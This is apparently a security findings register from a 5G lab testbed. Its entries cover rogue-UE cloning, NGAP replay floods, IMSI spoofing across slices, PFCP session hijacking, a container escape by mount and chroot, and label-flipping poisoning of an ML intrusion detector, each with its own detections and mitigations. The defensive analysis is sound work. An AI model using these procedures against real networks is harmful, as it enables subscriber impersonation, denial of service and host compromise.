TR-RAN-001,Rogue UE instantiated with cloned SIM credentials against a live gNB,RAN,Radio access and radio-link simulation,Critical,Confirmed,"UE (UERANSIM nr-ue), gNB 172.18.0.15, AMF 172.18.0.14","An unprovisioned UE container was launched carrying a complete 5G-AKA credential set on the command line — PLMN, MSISDN, the permanent key K, the OPc, the APN and the target gNB address — and attached directly to the core's Docker network with `NET_ADMIN` and `/dev/net/tun`. The same K and OPc are recoverable from the subscriber database (TR-DB-001), so these are stored production credentials, not synthetic values. The UE registered successfully and later raised three simultaneous contexts with working user-plane reachability.",Service consumed under the victim's billing identity; charging and lawful-intercept records attributed to the wrong subscriber; a persistent authenticated foothold on the user plane. Remediation requires physical SIM replacement.,"Alert on one SUPI registering from two distinct IMEISVs, on registrations with absent or repeated PEI, and on more UE contexts per gNB than provisioned. The operator's own check — `docker logs <amf> | grep -i ""Number of gNB-UEs""` (`bash_history_v1:425`) — is exactly the right signal, but it was run manually rather than alerted on.","Hold K/OPc only in an HSM or SIDF vault so the core computes authentication vectors without ever exposing the key. Enforce SUPI-to-PEI binding and reject registrations where the pair changes. Strip `NET_ADMIN` and `/dev/net/tun` from any container that is not an authorised RAN element, and restrict who may attach workloads to the core network."
TR-RAN-002,"Unanswered ARP/RLS storms toward the gNB — three modules, three distinct causes, one shared signature",RAN,Radio access and radio-link simulation,High,Probable,"UE(s) 172.18.0.16 and others, gNB 172.18.0.15, a second gNB on a slice-2 network never captured (IP per the guide's own worked example, not independently observed — see below), Docker bridge 172.18.0.0/16","Per module, since the three affected captures have three different causes: - **module2 — IMSI-flood registration load, not a stale peer.** The module 02 guide (`script.sh`) launches **five parallel `nr-ue` processes of 200 UEs each — 1,000 simulated UEs — repeated 2–3 times**, with `docker compose -f ngc.yaml down/up`, `./register_subscriber.sh` and `gnb1.yaml up -d` between repeats. At that concurrency, most of the 1,000 UE state machines are mid cell-search or mid-registration at any instant the AMF/gNB pair is bounced, which is exactly what produces sustained, high-rate RLS/ARP traffic from many UE processes at once rather than one leftover peer. **101,159 ARP requests, 32 replies** (3,161:1) and a peak of 18,947 pps are the aggregate signature of a 1,000-UE flood against a repeatedly-restarted gNB, not of a single orphaned client. - **module5 — expected, guide-directed restart.** The slicing guide's own step 1 and step 6 are `docker compose down` then `docker compose up -d` to apply an SMF/AMF config change. **6,132 requests, 0 replies** during that window is the UE transmitting into a gNB that the guide itself just took offline on purpose; this is normal lab housekeeping, not an incident. - **module6 — gNB2 is on a different Docker network than the capture vantage point.** The cross-slice IMSI-spoof exercise (see the new entry below, ""IMSI-spoof cross-slice session hijack attempted"") targets a second gNB, discovered via `arp-scan --localnet --interface eth0` (`bash_history_v2:132-136`, generic output, no specific address recorded there). The guide's own worked example resolves this to `172.19.0.18`; that specific value is not independently observed anywhere in this dataset's artefacts and should be read as the guide's canonical answer rather than a confirmed fact about this run — see `TR-RAN-003` for the full discussion. What *is* confirmed is that `172.19.0.0/16` never appears anywhere in `module6.pcap`'s host list — the capture vantage point (the primary `172.18.0.0/16` bridge) cannot see slice 2's network at all, whatever its exact address. **96,285 requests, 0 replies** here is a UE calling for the *original* gNB (`172.18.0.15`) while attention and traffic are on gNB2, compounded by never being able to see whichever side would answer.",Control-plane latency and loss for unrelated network functions; neighbour-cache pressure on the container host; monitoring noise that masks genuine attacks. Reproduced with several UEs it becomes a practical RAN-originated denial of service against the core.,"Alert when ARP requests for a target exceed replies beyond a small ratio over a rolling window — here it reached 3,161:1 against a 1:1 baseline. Baseline UDP/4997 pps per UE-gNB pair. Track flow count per peer pair: 603 flows for one pair in 424 s is itself the anomaly.",Put the RLS/fronthaul channel on its own segment so it cannot contend with N2/N3/N4/SBI. Apply exponential back-off and an absolute retry ceiling to UE cell search. Rate-limit ARP per bridge port. Ensure RAN teardown also stops or reconfigures its peers rather than leaving them pointed at a released address (TR-VIRT-005).
TR-RAN-003,Cross-slice IMSI-spoof session hijack attempted — never reaches the RAN from this vantage point,RAN,Radio access and radio-link simulation,High,Probable,"UE, a second gNB on slice 2 (not visible from this capture; IP and the specific subscriber/neighbour IMSI pair below are per the guide's own worked example, not independently observed — see ""Why this is Probable"")","Following the PFCP session-deletion attempt (TR-N4-003), the module 06 guide directs the operator to pivot to a second attack against the *other* network slice. `arp-scan --localnet --interface eth0` is run (confirmed, `bash_history_v2:132-136`) to find a second gNB serving a second Docker network for slice 2. **Everything from this point in the paragraph is the guide's own worked example** — its stated expected answers, not values independently recovered from this dataset's pcap or bash-history artefacts (the bash history itself only ever shows generic placeholder tokens such as `<gNB2-IP>` where a concrete value would go — see Evidence below): the guide resolves the discovered gNB to **`172.19.0.18`** (slice 2, `SST=2`, `SD=0x222222`, versus slice 1's `SD=0x111111`), separate from the primary `172.18.0.0/16` slice-1 network this capture watches. The subscriber configuration (`ue.yaml`) is edited to point at gNB2 and to request the slice-2 NSSAI, and the guide's own worked example changes the IMSI from `imsi-999700000000001` to the sequentially adjacent `imsi-999700000000010` — i.e. an attacker who already possesses one subscriber's full credential block (K, OPc — TR-SUB-001) enumerates the *trailing digit* of the IMSI within the same allocation block to claim a neighbouring subscriber's identity, rather than needing to steal that specific subscriber's credentials independently. `nr-ue -c /etc/snseiimm/uu.yaml -n 3` (or `nr-uu -c uu.yaml -n 3`, both forms appear, confirmed in the bash history) then raises three additional simultaneous UE contexts, which — per the guide's own worked example and stated goal of forcing ""legitimate users off the network"" — brings the total to **six concurrent tunnel interfaces** under the operator's control across both slices, demonstrating slice-crossing session hijack. The exercise closes with Blue Team mitigation described the same way in the guide: inspecting the UPF's three active interfaces for a 100-byte malicious PFCP signature from `10.0.45.0/24`, an `iptables -A INPUT -s 10.0.45.0/24 -p udp --dport 8805 -j DROP` rule, and a WebUI audit (`http://127.0.0.1:9999`, default credentials `admin`/`1423`) that surfaces a subscriber record with a mismatched IMEI. None of the numeric specifics in this paragraph beyond the `arp-scan` invocation itself are confirmed by this dataset's own artefacts; they are recorded because they are the designed, intended outcome the operator was following a published guide to produce, and because the *technique* (sequential-IMSI enumeration plus slice-boundary crossing) does not depend on which exact numbers were used.",If the designed outcome occurred as specified: displacement of a legitimate subscriber's session via duplicate registration; unauthorised presence on a second network slice with different QoS/isolation guarantees; traffic interception on that slice. Impact as actually observable from this dataset: none directly confirmable — this entry itself is evidence that the deployment's slice-2 traffic is entirely outside the retained telemetry's reach.,"Alert on any SUPI/IMSI registering within N (e.g. 5) numeric values of another active subscriber's identity in a short window. Alert on one credential set (K/OPc) being used to authenticate under two different SUPIs. Most importantly for this dataset: **instrument slice 2's network segment** — a capture position on `172.18.0.0/16` alone structurally cannot see this attack class at all, which is an architectural blind spot independent of any specific detector.","Allocate SUPIs non-sequentially. Bind SUPI-to-slice authorisation at the UDM and reject NSSAI requests inconsistent with the subscriber's provisioned slices. Apply the same credential-vaulting mitigation as TR-RAN-001. Extend capture/monitoring to every slice's network segment, not only the primary one — see `paper/GROUND-TRUTH-CROSSCHECK.md` §7b (TR-OPS-001 multi-vantage capture)."
TR-N2-001,NGAP replay flood against the AMF with 2000x duplication,N2,N2 / NGAP control plane,Critical,Confirmed,"AMF 172.18.0.14, Docker gateway 172.18.0.1, gNB 172.18.0.15","The Montimage 5GReplay tool was downloaded, pointed at a sample 5G standalone capture containing genuine NGAP exchanges, and reconfigured so its forwarding target was no longer the loopback placeholder shipped with the tool but the live AMF at `172.18.0.14`. The capture was replayed with every packet duplicated **2,000 times**. Injection entered the core from the Docker bridge gateway and the AMF accepted it on SCTP/38412: **52,666 packets inbound and 55,892 outbound** on that single association inside a two-minute window. The capture covering this activity (module3) holds 4,267,925 frames; its flow records account for 2,115,209 packets, of which 1,473,880 are SCTP.","Registration and mobility failure for every UE served by the AMF; SCTP association instability with all attached gNBs; exhaustion of AMF UE-context state. Because the replayed messages are structurally valid, the AMF spends real work on each one — the attack is far cheaper for the adversary than for the victim.","Alert on NGAP arriving over an SCTP association whose peer is not a provisioned gNB — here the source was the bridge gateway `172.18.0.1`, which is not a RAN element and should never appear on N2. Alert on NGAP message rate per association exceeding a few hundred per second (baseline across module0/1 is under 5/s). Detect duplicate NGAP PDUs by hashing the payload: 2,000 identical copies is unambiguous. Watch for inbound SCTP INIT to 38412 from unexpected sources.","Enforce IPsec or DTLS on N2 as TS 33.501 §9.2 requires, with peer certificates so only provisioned gNBs can establish an association. Filter SCTP/38412 to the known gNB address set at the fabric, not just at the host. Rate-limit NGAP per association and per gNB. Deploy duplicate-PDU detection at the AMF ingress."
TR-N2-002,"N2 carries NGAP and NAS with no IPsec, DTLS or anti-replay",N2,N2 / NGAP control plane,High,Confirmed,"AMF 172.18.0.14, gNB 172.18.0.15","The entire N2 reference point is plain SCTP on port 38412 with PPID 60 (NGAP). No IPsec ESP, no DTLS, no IKE negotiation appears anywhere in any capture. Every NGAP procedure — `InitialUEMessage`, `InitialContextSetup`, `PDUSessionResourceSetup`, `UplinkNASTransport`, `DownlinkNASTransport`, `UEContextRelease` — was decoded straight from the wire by a dependency-free parser written for this analysis, with no keys and no prior knowledge.","Full visibility of every UE's mobility and session signalling; the ability to inject, replay or modify NGAP; and the loss of any cryptographic basis for trusting that a message came from the gNB it claims to. Every N2-dependent finding in this catalogue inherits from this one.","Assert the *presence* of the control rather than the absence of attacks: alert if any NGAP PDU is observable in cleartext on a monitoring tap, and alert if an SCTP association to 38412 is established without a preceding IKE exchange from the same peer.","Deploy IPsec ESP in transport mode on N2 with IKEv2 and certificate-based peer authentication, per TS 33.501 §9.2. Where a vendor cannot support it, terminate N2 on a security gateway. Do not rely on ""the RAN is a trusted network"" — in this deployment the RAN shares an L2 segment with the subscriber database."
TR-N3-001,GTP-U tunnel endpoint identifiers enumerated from the capture position,N3,N3 / GTP-U user plane,High,Confirmed,"gNB 172.18.0.15, UPF 172.18.0.12, UE address pool 10.45.0.0/24","The operator ran targeted `tshark` filters to extract GTP-U Tunnel Endpoint Identifiers from the N3 interface, correlating them with the inner UE IP address so that each TEID could be attributed to a specific subscriber session. Two TEIDs were recovered this way — `0xb925` for UE `10.45.0.2` and `0x1c77` for UE `10.45.0.3` — along with the complete inner packet contents of the tunnelled traffic.","With a valid TEID an adversary can inject packets that the UPF will forward as if they came from the subscriber, or redirect the subscriber's traffic. Combined with TR-VIRT-004 (no segmentation) the reachability precondition is already satisfied. Separately, the inner payloads disclose subscriber activity directly.",Alert on GTP-U arriving at the UPF from a source that is not a provisioned gNB. Alert on a TEID appearing from two different source addresses. Baseline the TEID set per gNB and alert on unknown values — in this deployment only two TEIDs were ever legitimately in use.,Enforce IPsec on N3 per TS 33.501 §9.3. Allocate TEIDs from a cryptographically random 32-bit space rather than sequentially. Bind each TEID to its peer address at the UPF and drop packets whose source does not match the F-TEID recorded at session establishment.
TR-N3-002,User-plane desynchronisation: every G-PDU answered with Error Indication,N3,N3 / GTP-U user plane,High,Confirmed,"gNB 172.18.0.15, UPF 172.18.0.12, SMF 172.18.0.9","In module1 the gNB sends 352 GTP-U `G-PDU` packets on TEID `0xb925` and `0x1c77`, and the UPF answers **every single one** with a GTP-U `Error Indication` carrying TEID `0x0` — a 352:352, one-for-one failure rate. The gNB believes it holds a valid bearer; the UPF has no matching forwarding state for it. The subscriber's traffic (ICMP echo to `8.8.8.8` sourced from `10.45.0.2`) never leaves the core.","Total loss of data service for the affected subscribers with no control-plane alarm. Deliberately induced via N4 (TR-N4-002), this is a targeted, stealthy per-subscriber denial of service — the AMF still reports the UE as registered.",This is one of the highest-value detections in the whole dataset and it is cheap: **alert on any sustained GTP-U Error Indication rate at the UPF.** A healthy user plane produces approximately zero. Here the ratio was 1:1 for 352 consecutive packets and nothing fired. Also reconcile N4 session count against N2 PDU-session count and alert on divergence.,"Have the UPF signal PFCP Session Report on repeated Error Indication so the SMF can tear down or re-establish the bearer. Make N2 and N4 session lifecycles transactional, so a deleted N4 session forces a corresponding release on N2. Monitor the Error Indication counter as a first-class KPI."
TR-N4-001,PFCP session management unauthenticated and unencrypted on N4,N4,N4 / PFCP session management,Critical,Confirmed,"SMF 172.18.0.9, UPF 172.18.0.12","The N4 reference point runs as plain UDP on port 8805 with no IPsec, no DTLS and no PFCP-level authentication. Every session-management message was decoded directly from the capture: `SessionEstablishmentRequest`/`Response`, `SessionModificationRequest`/`Response`, `SessionDeletionRequest`/`Response` and continuous `HeartbeatRequest`/`Response`, each with its SEID visible. Across the corpus 22,588 PFCP packets were observed and every one was readable.","Unauthorised creation, modification or deletion of any PDU session; redirection of a subscriber's user plane to an attacker-controlled endpoint by rewriting the outer F-TEID; silent per-subscriber denial of service that presents exactly as TR-N3-002.",Alert on PFCP from any source other than the provisioned SMF address. Alert on session-management messages that do not correlate with a preceding SBI `Nsmf_PDUSession` transaction. Track the SEID population and alert on references to SEIDs the UPF never issued.,Enforce IPsec ESP on N4 per TS 33.501 §9.9. Bind the PFCP association to an authenticated peer identity and reject messages from unassociated sources. Place N4 on a dedicated segment unreachable from workload containers.
TR-N4-002,PFCP session identifiers occupy 12 bits of a 64-bit space,N4,N4 / PFCP session management,Critical,Confirmed,"SMF 172.18.0.9, UPF 172.18.0.12, all PDU sessions","Every PFCP Session Endpoint Identifier observed across the whole corpus was collected and measured. There are 26 distinct SEIDs and the largest is **`0xf45`** (3,909 decimal). The specification allocates 64 bits to the SEID; this deployment uses **12**. The values are also small and clustered rather than sparse — `0xa`, `0x9b`, `0x32a`, `0x386`, `0x3ea`, `0x55d`, `0x5f2`, `0x7b6`, `0x7bf`, `0x9d1`, `0x9f4`, `0x9f7`, `0xa15`, `0xf15`, `0xf45` — consistent with a small sequential or low-entropy allocator.","Mass teardown of every PDU session on a UPF from a single unauthenticated host, or targeted redirection of an individual subscriber's user plane to an attacker-chosen endpoint. Neither leaves a control-plane alarm; the symptom presents as TR-N3-002.","Alert on PFCP request rate to the UPF above a low threshold — a brute-force sweep is thousands of messages in seconds against a normal rate of a handful per session event. Alert on `SessionDeletionRequest` or `SessionModificationRequest` referencing a SEID the UPF never issued, and on any PFCP cause value indicating ""Session context not found"" occurring repeatedly. Reconcile the UPF's session count against the SMF's continuously.",Allocate SEIDs from the full 64-bit space using a CSPRNG — this is the single highest-value fix in this catalogue relative to effort. Enforce IPsec on N4 (TR-N4-001) so guessing the SEID is not sufficient. Rate-limit PFCP per source. Reject session-management messages whose source address is not the associated SMF.
TR-N4-003,PFCP exploitation tooling staged and targeted inside the core,N4,N4 / PFCP session management,High,Probable,"SMF 172.18.0.9, UPF 172.18.0.12, gNB, container host","A purpose-built script named `pfcpExploit.py` was searched for across every container on the host, inspected for its handling of SEIDs, and invoked with arguments naming the gNB address and a ""FUUP"" (forward user-plane) IP. In the same window the operator enumerated what was listening on the N4 port from inside a container and ran an ARP sweep of the local segment. The script itself is never recovered in the captured filesystem output.",If executed successfully against this deployment the tool inherits TR-N4-001 and TR-N4-002 and can redirect or destroy arbitrary PDU sessions. The staging activity alone indicates an adversary that has already mapped N4 and is one step from that outcome.,"The reconnaissance is the detectable phase and it is noisy: `docker exec ... find / -name ""pfcpExploit.py""` across every container, repeated `ss -lunp | grep 8805`, and a container spawning `tcpdump` on udp/8805. Alert on any container executing a packet-capture tool, and on cluster-wide `find` sweeps.","As TR-N4-001 and TR-N4-002. Additionally: prevent `docker exec` into production network-function containers from non-privileged operator accounts, and remove interactive shells and packet-capture binaries from NF images."
TR-SUB-001,"Long-term SIM keys recoverable in cleartext, shared across all subscribers",SUB,Subscriber identity and credential privacy,Critical,Confirmed,"MongoDB 172.18.0.2, UDR 172.18.0.4, AUSF 172.18.0.6, all six subscriber records","The permanent subscriber key **K** and the operator variant **OPc** are recoverable in two independent ways. First, the subscriber database returns them verbatim in a query response (TR-DB-001). Second, the UDR hands them to the AUSF over the service-based interface as plain JSON in an authentication-vector response. Both are readable with no keys and no decryption. Worse, **all six provisioned subscribers share the same K and the same OPc**.","Complete and permanent compromise of subscriber authentication. Offline decryption of any captured session for those subscribers, past or future. Undetectable impersonation. With a shared key across the population, one disclosure compromises every subscriber. Recovery requires physical SIM replacement for the entire base.","Alert on any query to the `subscribers` collection that projects the `security` sub-document, and on any client other than the UDR connecting to the subscriber database. At the network layer, alert on `encPermanentKey` or `encOpcKey` appearing in a plaintext payload — in a correctly configured deployment that string should never be observable.","Store K in an HSM or a SIDF/credential vault and expose only a *compute-authentication-vector* operation, never the key. Never return `security.k` or `security.opc` from an application query. Enforce TLS on all SBI hops (TR-SUB-003). Use a unique K per subscriber — the shared key here removes any containment. Encrypt the subscriber database at rest with per-field keys the application cannot export in bulk."
TR-SUB-002,SUCI null-scheme leaves the permanent subscriber identity unprotected,SUB,Subscriber identity and credential privacy,High,Confirmed,"UE, AMF 172.18.0.14, AUSF 172.18.0.6, all subscribers","Every SUCI observed in the captures uses **protection scheme 0** — the null scheme. The SUCI format is `suci-<supi type>-<mcc>-<mnc>-<routing indicator>-<protection scheme>-<HN key id>-<scheme output>`, and in every instance the sixth field is `0`, which means the ""scheme output"" is the MSIN in plaintext rather than an ECIES ciphertext: ``` suci-0-999-70-0000-0-0-0000000001 suci-0-999-70-0000-0-0-0000000002 suci-0-999-70-0000-0-0-0000000003 ^ ^ | └── home network public key id = 0 (none) └──────── protection scheme = 0 (null scheme) ```","Permanent subscriber tracking: the same identifier appears at every registration, in every cell, forever. Enables targeted follow-on attack against a named subscriber, correlation of a subscriber's movements, and confirmation of presence in a location — the classic IMSI-catcher capability that 5G was specifically designed to eliminate.","Assert the control: alert on any SUCI whose protection-scheme field is `0` arriving at the AMF. This is a single-field check on the registration path and it is definitive. Also alert if the same `scheme output` value recurs across registrations — under ECIES it is freshly randomised each time, so repetition proves the null scheme even without parsing the field.","Provision a home-network public key and mandate ECIES Profile A or B, rejecting null-scheme SUCI at the AMF except for unauthenticated emergency calls as TS 33.501 §6.12.2 permits. Verify that USIM personalisation includes the SIDF key — the null scheme is usually a provisioning omission rather than a deliberate choice."
TR-SUB-003,SUPI and IMEISV traverse the service-based interface in cleartext,SUB,Subscriber identity and credential privacy,High,Confirmed,"All SBI network functions, SCP 172.18.0.10, NRF 172.18.0.13","The entire service-based interface runs as cleartext HTTP/2 (`h2c`) on TCP/7777. No TLS handshake occurs anywhere in the corpus. Every inter-NF JSON body is readable, and those bodies carry permanent subscriber identifiers in the clear — the SUPI as `imsi-<15 digits>` embedded in resource URIs and callback references, and the device identity as `pei: imeisv-<16 digits>`.","Continuous disclosure of who is on the network, what device they use, which slice and DNN they consume and when they attach. Feeds subscriber tracking, targeted attack selection and TR-SUB-004. Absent OAuth 2.0, a rogue NF that reaches the SCP can also *invoke* services, not merely observe them.","Assert the control: alert on any cleartext HTTP/2 on an SBI port, and on any NF service request lacking a validated OAuth 2.0 access token. Alert on `imsi-` appearing in a plaintext payload — in a correct deployment the string should never be observable.","Enforce TLS 1.2+ with mutual certificate authentication on every SBI hop, including SCP-to-NF, per TS 33.501 §13.1. Enable NRF-issued OAuth 2.0 access tokens and validate them at every NF. Use the 5G-GUTI rather than the SUPI in resource URIs wherever the procedure allows. Ensure `callbackReference` values are `https://`."
TR-SUB-004,"SUPI-to-IP bindings disclosed, enabling subscriber traffic attribution",SUB,Subscriber identity and credential privacy,High,Confirmed,"PCF 172.18.0.8, SMF 172.18.0.9, UPF 172.18.0.12, UE pool 10.45.0.0/24","Policy-control signalling on the SBI carries an explicit mapping from the permanent subscriber identity to the IP address allocated to that subscriber's PDU session. The bindings are readable in cleartext and change over time as sessions are re-established, so the full history of which subscriber held which address, and when, is reconstructible from the capture alone.","Every user-plane packet becomes attributable to a named subscriber. Enables per-subscriber profiling, selective interception, and targeting of an individual's traffic for TR-N3-001 follow-on. Combined with TR-SUB-002 the subscriber is identified permanently rather than per-session.","Alert on `""supi""` co-occurring with `""ipv4Addr""` in any cleartext payload. Alert on any consumer of Npcf/Nsmf policy services that is not a registered NF.",TLS on SBI (TR-SUB-003) removes the disclosure at source. Restrict policy-control service access with OAuth 2.0 scopes so only the SMF may read SUPI-to-address bindings. Log and review every bulk read of session bindings — that pattern has no legitimate operational use.
TR-DB-001,Subscriber database accepts unauthenticated queries,DB,Subscriber data repository,Critical,Confirmed,"MongoDB 172.18.0.2, UDR 172.18.0.4, WebUI 172.18.0.5","The MongoDB instance backing the UDR accepts and answers queries with **no authentication whatsoever**. Byte-level search across every MongoDB frame in the corpus for `saslStart`, `saslContinue`, `SCRAM-SHA`, `authenticate` and `speculativeAuthenticate` returns nothing: there is no authentication handshake to fail, because none is attempted and none is required. Clients connect, issue `isMaster`, and query `open5gs.subscribers` directly. At least four distinct clients did so across the captures, including two ephemeral containers that are not part of the core.","Complete read and write access to the subscriber base for anything that can reach TCP/27017. Read yields TR-SUB-001 (all K/OPc) and the full subscriber inventory. Write permits provisioning fraudulent subscribers, elevating slice or AMBR entitlements, or deleting subscribers to deny service. No audit trail attributes any of it.",Alert on any connection to the subscriber database from a source outside the explicit allow-list (UDR and provisioning WebUI only) — here `172.18.0.17` and `172.18.0.15` both appeared and neither belongs. Alert on the `mongosh` client string reaching the production database at all: an interactive shell has no place there. Alert on any query projecting the `security` sub-document.,"Enable MongoDB SCRAM authentication with per-service accounts and least-privilege roles, and bind the listener to the UDR's interface only. Enable TLS on the database connection. Apply a network policy so only the UDR and provisioning service can reach TCP/27017. Enable database auditing so every read of `security` is attributable. Remove `mongosh` from images that reach the production database."
TR-DB-002,"Standard subscriber-management tooling discloses the full subscriber base, indistinguishably from a malicious dump",DB,Subscriber data repository,High,Confirmed,"MongoDB 172.18.0.2, tools containers 172.18.0.17, 172.18.0.15","The image name in the command, `gradiant/55pttolsdeons:0.10.3`, anonymised alongside every other container/service identifier in this release, decodes under the dataset's own naming pattern (13-character token, Gradiant is a real publisher of Open5GS/UERANSIM tooling images) to **`open5gs-dbctl`** — Open5GS's own official subscriber-administration CLI, whose real subcommands include `showfiltered` and `showpretty`. The module 05 network-slicing guide's own step 4/6 instructs the operator to **""verify with `dbctl showpretty`""** as the normal way to confirm a slice edit reached the subscriber record. The three invocations in the histories (`bash_history_v1:319`, `:488`, `bash_history_v2:66`) are consistent with exactly this guide-directed verification step, run once per module in which a subscriber or slice was edited, not with a single adversarial reconnaissance burst. In module5 the whole subscriber base came back in **two frames**: six records, each with IMSI, slice, session and the `security` sub-document containing K and OPc. The container then exited, leaving nothing on disk and no account to trace.","The whole subscriber base — identities plus root keys — is one `docker run` away from anyone who can reach the core bridge, using a publicly available, officially maintained tool image, not a bespoke exploit. Whether this specific invocation was the lab's own housekeeping or not, an attacker's use of the identical tool is unreconstructable after the fact by anyone relying only on host logs, because the container leaves none.","Detection cannot rely on distinguishing this tool from ""legitimate"" use — that is the point of this entry. Alert on any connection to TCP/27017 from a source that is not the provisioned UDR/provisioning service, regardless of the client's identity or apparent intent. Alert on any MongoDB `find`/`aggregate` against `subscribers` that returns more than a handful of documents. Require an audit trail (who, when, why) for every invocation, since the network layer alone cannot provide one.","Enforce MongoDB authentication and per-service authorisation (TR-DB-001) so *no* tool, official or otherwise, can read anything without a credential and an audit record. Apply admission control so only approved images attach to the core network. Require that administrative tooling — including `open5gs-dbctl` itself — runs through an audited bastion with per-operator identity, not as an anonymous disposable container. Remove `security.k`/`security.opc` from any tool's output projection by default; require an explicit, logged flag to include them."
TR-VIRT-001,Container escape to the host filesystem from a network-function container,VIRT,"Virtualisation, containers and segmentation",Critical,Confirmed,"Container host 10.10.3.20, NF container mns1aifs1r5erp5drg1noou5mi, all co-resident containers","From inside a running 5G network-function container the operator remounted `devtmpfs` to expose the host's block devices, mounted the host's LVM root volume at `/mnt`, and `chroot`ed into it — a shell on the host filesystem, from within the container. The escape was confirmed by reading a file that exists only on the host, and repeated successfully after the core was torn down and brought back up, showing it is a property of the deployment rather than of one container instance.","Full host compromise. Every network function, the subscriber database, the Docker daemon, the capture files and any credential on the host are exposed. From the host the adversary can modify NF configuration, install persistence that survives container restarts, and pivot to the management network where Zabbix and Wazuh live.","Alert on `mount` executed inside any container — a network function never legitimately mounts a filesystem at runtime. Alert on `chroot` inside a container. Alert on any container whose `HostConfig.Privileged` is true, or whose `CapAdd` includes `SYS_ADMIN`, at admission time rather than at runtime. Watch for `capsh --print` and reads of `/proc/self/status` Cap lines — these are reconnaissance for exactly this escape.","Remove `privileged: true` and `CAP_SYS_ADMIN` from every network-function container; UPF and gNB usually need only `NET_ADMIN` and specific devices. Enforce a seccomp profile that denies `mount`, `pivot_root` and `chroot`. Run containers with user namespaces so container root is not host root. Apply the AppArmor profile the operator found unloaded. Use admission control to reject privileged containers outright."
TR-VIRT-002,Network-function containers hold excess capabilities and privileged mode,VIRT,"Virtualisation, containers and segmentation",High,Confirmed,"All 5G NF containers, container host 10.10.3.20","The operator systematically enumerated the security posture of every running container: privileged status, added Linux capabilities, AppArmor profile assignment, and mount configuration. The results drove the escape in TR-VIRT-001, which means at least one network-function container was running with the capabilities needed to mount host block devices. Separately, the rogue UE was launched with `--cap-add NET_ADMIN` and a host device passed through.","Provides the precondition for TR-VIRT-001 and for lateral movement between network functions on the same host. A compromised NF — reachable, for example, through TR-N4-001 — is one `mount` away from the host rather than contained.","Audit at admission, not at runtime: reject any container whose `Privileged` is true, whose `CapAdd` includes `SYS_ADMIN`/`SYS_PTRACE`/`SYS_MODULE`, or whose `AppArmorProfile` is `unconfined`. At runtime, alert on `capsh`, on reads of `/proc/self/status` Cap fields, and on cluster-wide `docker inspect` sweeps from an interactive session.",Drop all capabilities by default and add back only what each NF genuinely needs. Assign a non-default AppArmor or SELinux profile to every container. Apply a restrictive seccomp profile. Enforce these with an admission controller so they cannot be reintroduced by editing a compose file.
TR-VIRT-003,Container administration socket reachable from inside the workload,VIRT,"Virtualisation, containers and segmentation",High,Confirmed,"Docker daemon on 10.10.3.20, all NF containers","Every running container was searched for a bind-mounted `docker.sock`, and the mount configuration of a specific network-function container was inspected. `docker exec` was then used routinely — dozens of times across both histories — to obtain interactive shells inside production network functions including the AMF, SMF, UPF, UE and gNB.","Root-equivalent execution in every network function; with an exposed socket, host compromise without needing any container capability. Also defeats separation of duties — there is no distinction between ""may operate the AMF"" and ""may operate the UDR"".","Alert on any process inside a container opening `/var/run/docker.sock`. Alert on `docker exec` against production NF containers outside a change window, and on `docker inspect` sweeps across all containers from one session.","Never bind-mount `docker.sock` into a workload; where an agent needs the API, front it with a filtering proxy that permits only the required verbs. Require `docker exec` to go through an audited bastion with per-operator identity. Remove shells from NF images."
TR-VIRT-004,All 3GPP reference points share one unsegmented L2 broadcast domain,VIRT,"Virtualisation, containers and segmentation",Critical,Confirmed,"Entire core, Docker bridge 172.18.0.0/16","Every network function, the RAN simulator and the subscriber database sit on a single Docker bridge. One `tcpdump -i any` on the host captures N1/N2 signalling, N3 user traffic, N4 session management, the whole service-based interface and unauthenticated MongoDB at once — which is exactly how this repository was produced. ARP between every pair of network functions is visible, confirming a shared broadcast domain rather than routed isolation.","The amplifier for most of this catalogue. Converts ""an attacker would need to reach N4"" into ""any container can reach N4"". Makes ARP-based adversary-in-the-middle viable against every unprotected interface, and gives a single compromised workload visibility of all subscriber signalling.","Structural, so audit rather than alert: assert that N2, N3, N4, SBI and the database each sit on their own network, and alert on any container attached to more than one. Alert on ARP requests between hosts that have no protocol reason to speak — MongoDB ARPing for the PCF is an architecture defect made visible.","Place each reference point on its own Docker network or VLAN, with the subscriber database on a separate one again. Apply default-deny network policy between NFs and permit only the flows 3GPP requires. This one change would meaningfully reduce the exploitability of TR-N2-001, TR-N4-001, TR-N4-002, TR-DB-001, TR-DB-002 and TR-SUB-003 simultaneously."
TR-VIRT-005,Container address reuse misdelivers traffic to an unrelated workload,VIRT,"Virtualisation, containers and segmentation",Medium,Confirmed,"Docker IPAM on 172.18.0.0/16, gNB, UE, tools container","`172.18.0.15` was the gNB in modules 0–2. After that container was removed Docker returned the address to its pool and reissued it to the next workload — the ephemeral subscriber-database tools container of TR-DB-002. The UE, never told its peer had gone, kept transmitting to `172.18.0.15:4997`. In module5 the orphaned UE sent **44,886 packets to an address now owned by an unrelated container**, in the same capture and largely the same seconds in which that container was extracting the subscriber database.","Misattribution of security events — here the subscriber-database exfiltration appears to come from the gNB's address. Potential receipt of another workload's traffic by an unrelated, possibly attacker-controlled container.","Key detection on workload identity (container ID, service account, workload certificate), never on IP alone. Alert when an address changes owner while another host is still actively sending to it — the signature is a burst of unanswered ARP for an address that is in fact up.","Use static or reserved addressing for long-lived network functions. Quarantine released addresses for longer than any plausible peer timeout before reissue. Ensure teardown of a RAN or NF element also reconfigures or stops its peers. Record container identity, not just IP, in all flow and security logs."
TR-AI-001,Training-data poisoning of the intrusion-detection model by label flipping,AI,AI/ML security of the IDS pipeline,High,Confirmed,"IDS training corpus labeled_flows.csv, train_poisoned_ids.py, deployed IDS model","A network intrusion-detection classifier was trained on flows extracted from the 5G testbed, with classes including `Benign` and `ICMP_FLOOD`. A second training script was then written whose purpose was to poison that model: a subset of training samples had their labels flipped, the count of flipped samples was printed, and the effect was measured as an Attack Success Rate — the proportion of genuine `ICMP_FLOOD` test samples that the poisoned model classifies as `Benign`.","A targeted, persistent blind spot in the detection layer. Flood traffic passes as benign while the model's overall metrics stay healthy, so the failure is invisible to routine monitoring. The blind spot survives until the model is retrained on clean data — and if the pipeline keeps ingesting from the same source, retraining reintroduces it.","Compare per-class recall between model versions, not just overall accuracy — a targeted poisoning shows as one class collapsing while the aggregate holds. Checksum the training corpus and require signed provenance for every ingest batch. Alert on label distribution drift between training runs. Hold out a curated, immutable golden test set that the pipeline cannot modify, and gate deployment on per-class recall against it.","Sign and version training data; reject unsigned batches. Use robust training (trimmed loss, per-class outlier rejection) so a minority of flipped labels cannot dominate. Separate the duty of labelling from the duty of training. Never derive labels automatically from traffic an adversary can generate (TR-AI-004)."
